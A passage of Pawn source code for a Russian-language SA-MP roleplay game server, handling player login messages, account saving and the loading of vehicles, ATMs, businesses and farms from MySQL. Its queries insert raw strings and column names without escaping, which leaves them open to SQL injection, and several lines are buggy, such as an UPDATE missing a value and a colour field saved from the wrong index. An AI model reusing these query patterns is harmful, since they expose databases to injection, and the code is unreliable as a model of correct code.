		sscanf(PlayerInfo[playerid][pTexts], "p<,>a<i>[3]", PlayerInfo[playerid][pText]);
		sscanf(PlayerInfo[playerid][pPhones], "p<,>a<i>[3]", PlayerInfo[playerid][pPhone]);
		sscanf(PlayerInfo[playerid][pLics], "p<,>a<i>[5]",PlayerInfo[playerid][pLic]);
		SendMes(playerid, 0x33CCFFFF, "Добро пожаловать на сервер.");
	//	if(PlayerInfo[playerid][pAdmin] > 0) AdminLogged[playerid] = true, SendClientMessage(playerid, COLOR_WHITE,"Возможности administratora активированы, приятной игры!");
		if(PlayerInfo[playerid][pAdmin] > 0) SendMes(playerid, COLOR_WHITE,"Вы вошли как администратор: %d уровня",PlayerInfo[playerid][pAdmin]);
		if(PlayerInfo[playerid][pVIP] == true) SendClientMessage(playerid, COLOR_WHITE, "Возможности VIP аккаунта активированы, приятной игры!");
		format(string, 64, "~w~Welcome ~n~~b~   %s", PlayerInfo[playerid][pSendername]);
		GameTextForPlayer(playerid, string, 3500, 1);
		PlayerPlaySound(playerid, 30800, 0.0, 0.0, 0.0);
		if (PlayerInfo[playerid][pText][0] == 1)
		{
			SendClientMessage(playerid, COLOR_YELLOW, "[КВИТАНЦИЯ] Вы забыли оплатить за кварплату, ваш дом продали!");
			SendClientMessage(playerid, COLOR_YELLOW, "[КВИТАНЦИЯ] На ваш банковский счет возвращена стоимость дома по гос-ву");
			PlayerInfo[playerid][pText][0] = 0;
			format(PlayerInfo[playerid][pTexts], 20,  "%i, %i, %i", PlayerInfo[playerid][pText][0], PlayerInfo[playerid][pText][1], PlayerInfo[playerid][pText][2]);
			format(query, 256, "UPDATE "TABLE_ACCOUNT" SET text = '%s' WHERE name = '%s'", PlayerInfo[playerid][pTexts], PlayerInfo[playerid][pSendername]);
			mysql_query(query);
		}
		if(PlayerInfo[playerid][pText][1] == 1)
		{
			SendClientMessage(playerid, COLOR_YELLOW,"[НАЛОГОВАЯ СЛУЖБА] Ваш бизнес закрыли в связи с нехваткой ресурсов");
			SendClientMessage(playerid, COLOR_YELLOW,"[НАЛОГОВАЯ СЛУЖБА] Бюджет бизнеса зачислен на ваш банковский счет");
			PlayerInfo[playerid][pText][1] = 0;
			format(PlayerInfo[playerid][pTexts], 20, "%i, %i, %i", PlayerInfo[playerid][pText][0], PlayerInfo[playerid][pText][1], PlayerInfo[playerid][pText][2]);
			format(query, 256, "UPDATE "TABLE_ACCOUNT" SET text = '%s' WHERE name = '%s'", PlayerInfo[playerid][pTexts], PlayerInfo[playerid][pSendername]);
			mysql_query(query);
		}
		if(PlayerInfo[playerid][pText][2] == 1)
		{
			new p = PlayerInfo[playerid][pRefMoney] / 100000;
			for(new i = 1; i <= p; i++)
			{
				GiveMoney(playerid, 100000);
				PlayerInfo[playerid][pRefMoney] -= 100000;
			}
			PlayerInfo[playerid][pText][2] = 0;
			format(PlayerInfo[playerid][pTexts], 20, "%i, %i, %i", PlayerInfo[playerid][pText][0], PlayerInfo[playerid][pText][1], PlayerInfo[playerid][pText][2]);
			format(query, 256, "UPDATE "TABLE_ACCOUNT" SET text = '%s', refmoney WHERE name = '%s'", PlayerInfo[playerid][pTexts], PlayerInfo[playerid][pRefMoney], PlayerInfo[playerid][pSendername]);
			mysql_query(query);
		}
		if(PlayerInfo[playerid][pGunSkill][6] >= NORM_SKILLS_PLAYER) VehRe[playerid] = true;
		SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 0, 0, 0, 1.0, -1, -1, -1, -1, -1, -1);
		SpawnPlayer(playerid);
		new str123[12];
		GetPlayerIp(playerid,str123,12);
		format(string, 64, "%s зашел в аккаунт с ip: %s",PlayerInfo[playerid][pSendername],str123);
		Log("LogInfo",string);
		DeletePVar(playerid,"Acc");
		SetPlayerInt(PlayerInfo[playerid][pSendername], "online", 1);
		if(PlayerInfo[playerid][pAdmin] >= 1 && PlayerInfo[playerid][pAdminDuty] == 0) ShowPlayerDialog(playerid, D_DOSTUPADM, 3, "{FFFFFF}Доступ[ADM]", "{FFFFFF}Введите пароль!", "Ок","Отмена");
	}
	return true;
}
//==============================================================================
stock SaveAccount(playerid)
{
	if(PlayerLogged[playerid] == 0) return true;
	new src[128], ip[16];
	format(query,sizeof(query),"UPDATE "TABLE_ACCOUNT" SET ");
	GetPlayerIp(playerid, ip, 16);
	format(src,sizeof(src),"ip='%s',",ip);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"level=%d,",PlayerInfo[playerid][pLevel]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"admin=%d,",PlayerInfo[playerid][pAdmin]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"sex=%d,",PlayerInfo[playerid][pSex]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"ippassword='%s',",PlayerInfo[playerid][pIpPassword]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"model=%d,",PlayerInfo[playerid][pModel]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"loach=%d,",PlayerInfo[playerid][pChar]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"cash=%d,",GetMoney(playerid));
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"bank=%d,",PlayerInfo[playerid][pBank]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"mute=%d,",PlayerInfo[playerid][pMuted]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"warn=%d,",PlayerInfo[playerid][pWarn]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"leader=%d,",PlayerInfo[playerid][pLeader]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"member=%d,",PlayerInfo[playerid][pMember]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"rank=%d,",PlayerInfo[playerid][pRank]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"Voennik=%d,",PlayerInfo[playerid][pVoennik]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"pick=%d,",PlayerInfo[playerid][pPick]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"exp=%d,",PlayerInfo[playerid][pExp]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"news=%d,",PlayerInfo[playerid][pNews]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"crimes=%d,",PlayerInfo[playerid][pCrimes]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"wanted=%d,",PlayerInfo[playerid][pWanted]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"wantedtime=%d,",PlayerInfo[playerid][pWantedTime]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"wantedwho='%s',",PlayerInfo[playerid][pWantedWho]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"wantedreason='%s',",PlayerInfo[playerid][pWantedReason]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"jail=%d,",PlayerInfo[playerid][pJail]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"job=%d,",PlayerInfo[playerid][pJob]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"jailtime=%d,",PlayerInfo[playerid][pJailTime]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"checktime=%d,",PlayerInfo[playerid][pCheckTime]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"drugs=%d,",PlayerInfo[playerid][pDrugs]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"mats=%d,",PlayerInfo[playerid][pMats]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"heal='%f',",PlayerInfo[playerid][pHeal]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"married=%d,",PlayerInfo[playerid][pMarried]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"whomarried='%s',",PlayerInfo[playerid][pWhoMarried]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"paycheck='%i',",PlayerInfo[playerid][pPayCheck]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"fishing='%i',",PlayerInfo[playerid][pFish]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"lottery='%i',",PlayerInfo[playerid][pLottery]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"vip='%i',",PlayerInfo[playerid][pVIP]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"time='%i',",PlayerInfo[playerid][pTime]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"fstyle='%i',",PlayerInfo[playerid][pFightStyle]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"credits='%i',",PlayerInfo[playerid][pCredits]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"totalcredits='%i',",PlayerInfo[playerid][pTotalCredits]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"skin1='%i',",PlayerInfo[playerid][pSkin1]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"skin2='%i',",PlayerInfo[playerid][pSkin2]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"skin3='%i',",PlayerInfo[playerid][pSkin3]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"spawnchange='%i',",PlayerInfo[playerid][pSpawnChange]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"sdpistol='%i',",PlayerInfo[playerid][pGunSkill][0]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"deserteagle='%i',",PlayerInfo[playerid][pGunSkill][1]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"shotgun='%i',",PlayerInfo[playerid][pGunSkill][2]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"mp5='%i',",PlayerInfo[playerid][pGunSkill][3]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"ak47='%i',",PlayerInfo[playerid][pGunSkill][4]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"m4='%i',",PlayerInfo[playerid][pGunSkill][5]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"satiety='%i',",PlayerInfo[playerid][pSatiety]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"healths='%f',",PlayerInfo[playerid][pHealthS]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"sportexp='%i',",PlayerInfo[playerid][pSportEXP]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"online='%i',",PlayerInfo[playerid][pOnline]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"zakon='%i',",PlayerInfo[playerid][pZakon]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"ipcheck='%i',",PlayerInfo[playerid][ProverkaIP]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"hospital='%i',",PlayerInfo[playerid][pHospital]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"watch='%i',",PlayerInfo[playerid][pWatch]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"ciggare='%i',",PlayerInfo[playerid][pCiggare]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"sprunk='%i',",PlayerInfo[playerid][pSprunk]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"mask='%i',",PlayerInfo[playerid][pMask]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"phonebalance='%i',",PlayerInfo[playerid][pPhoneBalance]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"truckskill='%i',",PlayerInfo[playerid][pTruckSkill]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"cModel='%i',",PlayerInfo[playerid][cModel]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"cFuel='%i',",PlayerInfo[playerid][cFuel]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"cClass='%i',",PlayerInfo[playerid][cClass]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"cColor1='%i',",PlayerInfo[playerid][cColor][0]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"cColor2='%i',",PlayerInfo[playerid][cColor][0]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"cLock='%i',",PlayerInfo[playerid][cLock]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"cCost='%i',",PlayerInfo[playerid][cCost]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"cVehcom='%s',",PlayerInfo[playerid][cVehcom]);
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"cPaintjob='%i',",PlayerInfo[playerid][cPaintjob]);
	strcat(query,src,sizeof(query));
	
    format(src,sizeof(src),"Dostup='%i',",PlayerInfo[playerid][pDostup]);
	strcat(query,src,sizeof(query));
	
	format(PlayerInfo[playerid][pPhones],16,"%i, %i, %i",
	PlayerInfo[playerid][pPhone][0],PlayerInfo[playerid][pPhone][1], PlayerInfo[playerid][pPhone][2]);
	format(src,sizeof(src),"phone='%s',",PlayerInfo[playerid][pPhones]);
	strcat(query,src,sizeof(query));
	format(PlayerInfo[playerid][pLics],40,"%i, %i, %i, %i, %i",
	PlayerInfo[playerid][pLic][0],PlayerInfo[playerid][pLic][1],PlayerInfo[playerid][pLic][2]
	,PlayerInfo[playerid][pLic][3],PlayerInfo[playerid][pLic][4]);
	format(src,sizeof(src),"lic='%s',",PlayerInfo[playerid][pLics]);
	strcat(query,src,sizeof(query));
	if(GetPVarInt(playerid, "GunCheat") == 0)
	{
		for(new i = 0; i < 13; i++)
		{
			GetPlayerWeaponData(playerid, i, PlayerInfo[playerid][pGun][i], PlayerInfo[playerid][pAmmo][i]);
		}
		format(PlayerInfo[playerid][pGuns],40,"%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",
		PlayerInfo[playerid][pGun][0],PlayerInfo[playerid][pGun][1],PlayerInfo[playerid][pGun][2],
		PlayerInfo[playerid][pGun][3],PlayerInfo[playerid][pGun][4],PlayerInfo[playerid][pGun][5],
		PlayerInfo[playerid][pGun][6],PlayerInfo[playerid][pGun][7],PlayerInfo[playerid][pGun][8],
		PlayerInfo[playerid][pGun][9],PlayerInfo[playerid][pGun][10],PlayerInfo[playerid][pGun][11],PlayerInfo[playerid][pGun][12]);
		format(src,sizeof(src),"guns='%s',",PlayerInfo[playerid][pGuns]);
		strcat(query,src,sizeof(query));
		format(PlayerInfo[playerid][pAmmos],160,"%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",
		PlayerInfo[playerid][pAmmo][0],PlayerInfo[playerid][pAmmo][1],PlayerInfo[playerid][pAmmo][2],
		PlayerInfo[playerid][pAmmo][3],PlayerInfo[playerid][pAmmo][4],PlayerInfo[playerid][pAmmo][5],
		PlayerInfo[playerid][pAmmo][6],PlayerInfo[playerid][pAmmo][7],PlayerInfo[playerid][pAmmo][8],
		PlayerInfo[playerid][pAmmo][9],PlayerInfo[playerid][pAmmo][10],PlayerInfo[playerid][pAmmo][11],PlayerInfo[playerid][pAmmo][12]);
		format(src,sizeof(src),"ammos='%s',",PlayerInfo[playerid][pAmmos]);
	}
	strcat(query,src,sizeof(query));
	format(src,sizeof(src),"skills='%d'",PlayerInfo[playerid][pGunSkill][6]);
	strcat(query,src,sizeof(query));
	new playername[32];
	GetPlayerName(playerid,playername,32);
	format(src,sizeof(src)," WHERE name='%s'",playername);
	strcat(query,src,sizeof(query));
	mysql_query(query);
	return true;
}
//==============================================================================
stock SetPlayerStr(username[], stolb[], znach[])
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_ACCOUNT" SET  %s = '%s' WHERE name = '%s' LIMIT 1", stolb, znach, username);
	return mysql_query(Query);
}
//==============================================================================
stock SetPlayerFloat(username[],stolb[], Float:znach)
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_ACCOUNT" SET  %s = '%f' WHERE name = '%s' LIMIT 1", stolb, znach, username);
	return mysql_query(Query);
}
//==============================================================================
stock SetPlayerInt(username[], stolb[], znach)
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_ACCOUNT" SET  %s = '%d' WHERE name = '%s' LIMIT 1", stolb, znach, username);
	return mysql_query(Query);
}
//==============================================================================
stock SetVehicleInt(idx, stolb[], znach)
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_VEH" SET  %s = '%d' WHERE id = '%d' LIMIT 1", stolb, znach, idx);
	return mysql_query(Query);
}
//==============================================================================
stock SetHouseStr(idx, stolb[], znach[])
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_HOUSE" SET  %s = '%s' WHERE id = '%d' LIMIT 1", stolb, znach, idx);
	return mysql_query(Query);
}
//==============================================================================
stock SetHouseInt(idx, stolb[], znach)
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_HOUSE" SET  %s = '%d' WHERE id = '%d' LIMIT 1", stolb, znach, idx);
	return mysql_query(Query);
}
//
stock SetDachaInt(idx, stolb[], znach)
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_DUCH" SET  %s = '%d' WHERE dID = '%d' LIMIT 1", stolb, znach, idx);
	return mysql_query(Query);
}
stock SetDachaStr(idx, stolb[], znach[])
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_DUCH" SET  %s = '%s' WHERE dID = '%d' LIMIT 1", stolb, znach, idx);
	return mysql_query(Query);
}
//==============================================================================
stock SetBizzStr(idx, stolb[], znach[])
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_BIZZ" SET  %s = '%s' WHERE id = '%d' LIMIT 1", stolb, znach, idx);
	return mysql_query(Query);
}
//==============================================================================
stock SetBizzInt(idx, stolb[], znach)
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_BIZZ" SET  %s = '%d' WHERE id = '%d' LIMIT 1", stolb, znach, idx);
	return mysql_query(Query);
}
//==============================================================================
stock SetFractionStr(idx, stolb[], znach[])
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_FRACTION" SET  %s = '%s' WHERE id = '%d' LIMIT 1", stolb, znach, idx);
	return mysql_query(Query);
}
//==============================================================================
stock SetOtherStr(stolb[], znach[])
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_OTHER" SET  %s = '%s'", stolb, znach);
	return mysql_query(Query);
}
//==============================================================================
stock SetOtherInt(stolb[], znach)
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_OTHER" SET  %s = '%d'", stolb, znach);
	return mysql_query(Query);
}
//==============================================================================
stock SetATMInt(idx, stolb[], znach)
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_ATM" SET  %s = '%d' WHERE id = '%d' LIMIT 1", stolb, znach, idx);
	return mysql_query(Query);
}
//==============================================================================
stock SetMafiaStr(idx, stolb[], znach[])
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_MAFIA" SET  %s = '%s' WHERE id = '%d' LIMIT 1", stolb, znach, idx);
	return mysql_query(Query);
}
//==============================================================================
stock SetMafiaInt(idx, stolb[], znach)
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_MAFIA" SET  %s = '%d' WHERE id = '%d' LIMIT 1", stolb, znach, idx);
	return mysql_query(Query);
}
//==============================================================================
stock LoadVeh() // cars
{
	new time = GetTickCount();
	mysql_query("SELECT * FROM `"TABLE_VEH"`");
	mysql_store_result();
	if(mysql_num_rows() > 0)
	{
		for(new idx = 1; idx <= mysql_num_rows(); idx++)
		{
			mysql_fetch_row(query);
			sscanf(query, "p<|>iiffffiis[10]iii",
			VehInfo[idx][id],
			VehInfo[idx][vModel],
			VehInfo[idx][vX],
			VehInfo[idx][vY],
			VehInfo[idx][vZ],
			VehInfo[idx][vFa],
			VehInfo[idx][vInt],
			VehInfo[idx][vWorld],
			VehInfo[idx][vColors],
			VehInfo[idx][vFr],
			VehInfo[idx][vStatus],
			VehInfo[idx][vCost]);
			sscanf(VehInfo[idx][vColors], "p<,>a<i>[2]",VehInfo[idx][vColor]);
			if(VehInfo[idx][vStatus] == 0 || VehInfo[idx][vStatus] == 2)
			{
				VehInfo[idx][vVehicle] = CreateVehicle(VehInfo[idx][vModel], VehInfo[idx][vX], VehInfo[idx][vY], VehInfo[idx][vZ], VehInfo[idx][vFa], VehInfo[idx][vColor][0], VehInfo[idx][vColor][1], 300);
				LinkVehicleToInterior(VehInfo[idx][vVehicle], VehInfo[idx][vInt]);
				SetVehicleVirtualWorld(VehInfo[idx][vVehicle], VehInfo[idx][vWorld]);
				Fuel[VehInfo[idx][vVehicle]] = 200;
				Engine[VehInfo[idx][vVehicle]] = false;
				Lights[VehInfo[idx][vVehicle]] = false;
			}
			TOTALVEH++;
		}
	}
	mysql_free_result();
	printf(" [LOAD]: Успешная загрузка 'LoadVeh' - загружено %d за %d м.с", TOTALVEH,GetTickCount() - time);
}
//==============================================================================
stock LoadATM()
{
	new  time = GetTickCount();
	mysql_query("SELECT * FROM `"T_ATM"`");
	mysql_store_result();
	if(mysql_num_rows() > 0)
	{
		for(new idx = 1; idx <= mysql_num_rows(); idx++)
		{
			mysql_fetch_row(query);
			sscanf(query, "p<|>iffffff",
			ATMInfo[idx][ID],
			ATMInfo[idx][aX],
			ATMInfo[idx][aY],
			ATMInfo[idx][aZ],
			ATMInfo[idx][arX],
			ATMInfo[idx][arY],
			ATMInfo[idx][arZ]);
			TOTALATM++;
			ATM[idx] = CreateObject(2754, ATMInfo[idx][aX], ATMInfo[idx][aY], ATMInfo[idx][aZ], ATMInfo[idx][arX], ATMInfo[idx][arY], ATMInfo[idx][arZ]);
			LABELATM[idx] = Create3DTextLabel("Нажмите: ALT",COLOR_YELLOW, ATMInfo[idx][aX],ATMInfo[idx][aY],ATMInfo[idx][aZ],20.0,0,1);
		}
	}
	mysql_free_result();
	printf(" [LOAD]: Успешная загрузка 'LoadATM' - загружено %d за %d м.с", TOTALATM, GetTickCount() - time);
	return true;
}
//==============================================================================
stock LoadBizz()
{
	new time = GetTickCount();
	new string[128];
	mysql_query("SELECT * FROM `"TABLE_BIZZ"` ORDER BY  `"TABLE_BIZZ"`.`id` ASC ");
	mysql_store_result();
	for(new i; i < TOTALBIZZ; i++)
	{
		strmid(BizzInfo[i][bOwner],"None_Nones",0,strlen("None_Nones"),32);
	}
	if(mysql_num_rows() > 0)
	{
		for(new idx = 1; idx <= mysql_num_rows(); idx++)
		{
			mysql_fetch_row(query);
			sscanf(query, "p<|>is[32]iiiiifffffffffiiis[32]iiiiii",
			BizzInfo[idx][id],
			BizzInfo[idx][bOwner],
			BizzInfo[idx][bType],
			BizzInfo[idx][bPrice],
			BizzInfo[idx][bBuyPrice],
			BizzInfo[idx][bMoney],
			BizzInfo[idx][bLic],
			BizzInfo[idx][bEntrx],
			BizzInfo[idx][bEntry],
			BizzInfo[idx][bEntrz],
			BizzInfo[idx][bExitx],
			BizzInfo[idx][bExity],
			BizzInfo[idx][bExitz],
			BizzInfo[idx][bMenux],
			BizzInfo[idx][bMenuy],
			BizzInfo[idx][bMenuz],
			BizzInfo[idx][bInt],
			BizzInfo[idx][bVirtual],
			BizzInfo[idx][bMIcon],
			BizzInfo[idx][bName],
			BizzInfo[idx][bEnter],
			BizzInfo[idx][bLock],
			BizzInfo[idx][bProduct],
			BizzInfo[idx][bTill],
			BizzInfo[idx][bLockTime],
			BizzInfo[idx][bMafia]);
			TOTALBIZZ++;
			BizzInfo[idx][bIcon] = CreateDynamicMapIcon(BizzInfo[idx][bEntrx],BizzInfo[idx][bEntry],BizzInfo[idx][bEntrz], BizzInfo[idx][bMIcon], 0,-1,-1,-1,200.0);

			if(BizzInfo[idx][bType] != 2 && BizzInfo[idx][bType] != 7)
			{
				BizzInfo[idx][bPickup] = CreatePickup(19132,1, BizzInfo[idx][bEntrx],BizzInfo[idx][bEntry],BizzInfo[idx][bEntrz]);
				BizzInfo[idx][bPickupExit] = Create3DTextLabel("Для выхода введите '/exit'",0x33CCFFFF,BizzInfo[idx][bExitx], BizzInfo[idx][bExity], BizzInfo[idx][bExitz],20.0,BizzInfo[idx][bVirtual],1);
				BizzInfo[idx][bMenu] = CreateDynamicCP(BizzInfo[idx][bMenux],BizzInfo[idx][bMenuy],BizzInfo[idx][bMenuz], 1.0,BizzInfo[idx][bVirtual],BizzInfo[idx][bInt]);
				if(!strcmp(BizzInfo[idx][bOwner],"None",true))
				{
					format(string, 128, "Бизнес продается!\nНазвание: %s", BizzInfo[idx][bName]);
					LABELBIZZ[idx] = Create3DTextLabel(string,COLOR_LIGHTGREEN,BizzInfo[idx][bEntrx], BizzInfo[idx][bEntry], BizzInfo[idx][bEntrz],20.0,0,1);
				}
				else
				{
					format(string, 128, "Владелец: %s\nНазвание: %s", BizzInfo[idx][bOwner], BizzInfo[idx][bName]);
					LABELBIZZ[idx] = Create3DTextLabel(string,COLOR_LIGHTGREEN,BizzInfo[idx][bEntrx], BizzInfo[idx][bEntry], BizzInfo[idx][bEntrz],20.0,0,1);
				}
			}
			else if(BizzInfo[idx][bType] == 2)
			{
				if(!strcmp(BizzInfo[idx][bOwner],"None",true))
				{
					format(string, 128, "Заправка продается!\nНазвание: %s\nЦена за 1 литр - %i долларов", BizzInfo[idx][bName], BizzInfo[idx][bTill] / 3);
					LABELBIZZ[idx] = Create3DTextLabel(string,COLOR_LIGHTGREEN,BizzInfo[idx][bEntrx], BizzInfo[idx][bEntry], BizzInfo[idx][bEntrz],20.0,0,1);
				}
				else
				{
					format(string, 128, "Владелец заправки: %s\nНазвание: %s\nЦена за 1 литр - %i долларов",  BizzInfo[idx][bOwner], BizzInfo[TOTALBIZZ][bName], BizzInfo[idx][bTill] / 3);
					LABELBIZZ[idx] = Create3DTextLabel(string,COLOR_LIGHTGREEN,BizzInfo[idx][bEntrx], BizzInfo[idx][bEntry], BizzInfo[idx][bEntrz],20.0,0,1);
				}
			}
			else
			{
				if(!strcmp(BizzInfo[idx][bOwner],"None",true))
				{
					format(string, 128, "CTO продается!\nНазвание: %s\nЦена за 1 запчасть - %i долларов\nЧто бы тюниться, введите /tuning", BizzInfo[idx][bName], BizzInfo[idx][bTill]);
					LABELBIZZ[idx] = Create3DTextLabel(string,COLOR_LIGHTGREEN,BizzInfo[idx][bEntrx], BizzInfo[idx][bEntry], BizzInfo[idx][bEntrz],20.0,0,1);
				}
				else
				{
					format(string, 128, "Владелец CTO: %s\nНазвание: %s\nЦена за 1 запчасть - %i долларов\nЧто бы тюниться, введите /tuning",  BizzInfo[idx][bOwner], BizzInfo[TOTALBIZZ][bName], BizzInfo[idx][bTill]);
					LABELBIZZ[idx] = Create3DTextLabel(string,COLOR_LIGHTGREEN,BizzInfo[idx][bEntrx], BizzInfo[idx][bEntry], BizzInfo[idx][bEntrz],20.0,0,1);
				}
			}
		}
	}
	mysql_free_result();
	printf(" [LOAD]: Успешная загрузка 'LoadBizz' - загружено %d за %d м.с", TOTALBIZZ,GetTickCount() - time);
}
//==============================================================================
stock IsAFarmer(playerid)
{
	if(!strcmp(FarmInfo[fOwner],PlayerInfo[playerid][pSendername],true) || !strcmp(FarmInfo[fZam],PlayerInfo[playerid][pSendername],true) || !strcmp(FarmInfo[fFarmer1],PlayerInfo[playerid][pSendername],true)
			||!strcmp(FarmInfo[fFarmer2],PlayerInfo[playerid][pSendername],true) || !strcmp(FarmInfo[fFarmer3],PlayerInfo[playerid][pSendername],true) ||!strcmp(FarmInfo[fFarmer4],PlayerInfo[playerid][pSendername],true)) return true;
	return false;
}
//==============================================================================
stock LoadFarm()
{
	new time = GetTickCount();
	new string[128];
	mysql_query("SELECT * FROM `"TABLE_FARM"` ORDER BY  `"TABLE_FARM"`.`id` ASC ");
	mysql_store_result();
	for(new i; i < TOTALFARM; i++)
	{
		strmid(FarmInfo[fOwner],"none",0,strlen("none"),32);
	}
	if(mysql_num_rows() > 0)
	{
		for(new idx = 1; idx <= mysql_num_rows(); idx++)
		{
			mysql_fetch_row(query);
			sscanf(query, "p<|>is[32]s[32]s[32]iiis[32]s[32]s[32]s[32]iii",
			FarmInfo[id],
			FarmInfo[fOwner],
			FarmInfo[fZam],
			FarmInfo[fName],
			FarmInfo[fPrice],
			FarmInfo[fMoney],
			FarmInfo[fSeeds],
			FarmInfo[fFarmer1],
			FarmInfo[fFarmer2],
			FarmInfo[fFarmer3],
			FarmInfo[fFarmer4],
			FarmInfo[fPay],
			FarmInfo[fLockTime],
			FarmInfo[fMafia]);
			TOTALFARM++;
			if(FarmInfo[id] == 1)
			{
				CreateDynamicMapIcon(-382.4549,-1438.7761,25.7474, 20, 0,-1,-1,-1,200.0);
				FarmInfo[fPickup] = CreatePickup(1239,1, -382.4549,-1438.7761,25.7474);
				FarmInfo[fDuty] = CreatePickup(1275,1, -382.4306,-1426.3967,26.1818);
				CreatePickup(1239,1, -373.0145,-1428.7144,25.7266);
				if(!strcmp(FarmInfo[fOwner],"None",true))
				{
					format(string, 90, "Ферма: %s\nСтоимость: 500000\nДля покупки введите /buyfarm", FarmInfo[fName]);
					FarmInfo[fText] = Create3DTextLabel(string,COLOR_WHITE,-382.4549,-1438.7761,25.7474,20.0,0,1);
				}
				else
				{
					format(string, 128, "Ферма: %s\nВладелец: %s\n", FarmInfo[fName], FarmInfo[fOwner]);
					FarmInfo[fText] = Create3DTextLabel(string,COLOR_WHITE,-382.4549,-1438.7761,25.7474,20.0,0,1);
				}
			}
		}
	}
	mysql_free_result();
	printf(" [LOAD]: Успешная загрузка 'LoadFarm' - загружено %d за %d м.с", TOTALFARM,GetTickCount() - time);
}
//==============================================================================
stock LoadDuch()
{
   new time = GetTickCount();
   mysql_query("SELECT * FROM `"TABLE_DUCH"` ORDER BY  `"TABLE_DUCH"`.`dID` ASC ");
   mysql_store_result();
   for(new i; i < TOTALDUCH; i++)
   {
